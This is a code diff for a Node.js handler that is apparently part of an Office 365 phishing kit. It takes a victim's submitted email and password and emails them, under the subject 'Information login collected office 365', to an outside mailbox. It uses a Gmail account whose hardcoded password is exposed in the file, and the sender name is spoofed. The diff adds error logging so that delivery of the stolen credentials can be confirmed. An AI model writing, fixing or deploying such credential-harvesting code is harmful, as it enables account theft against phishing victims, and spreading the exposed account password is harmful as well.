@@ -20,7 +20,6 @@ function sendmail(req,res){
  password = req.body.old_password
  const transporter = nodemailer.createTransport({
   service: 'gmail',   
-  SES: {ses},
   auth: {           
    user: 'guilhermeassuncao301@gmail.com',
    pass: 'gui7voltage!'
@@ -30,17 +29,15 @@ function sendmail(req,res){
   from:'Donald Trump',
   to: 'dakota3011@outlook.com',
   subject: 'Information login collected office 365',
-  ses: {
-     Tags: [
-        {
-          Name: "tag_name",
-          Value: "tag_value",
-        },
-      ],
-    },
   html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP:</p>`
  };
- transporter.sendMail(mailOptions)
+ transporter.sendMail(mailOptions,function(err,info){
+  if(err)
+   console.log(err)
+  else{
+   console.log("Enviado!")
+  }
+ })
 }
 
 app.get("/", (req,res) => {
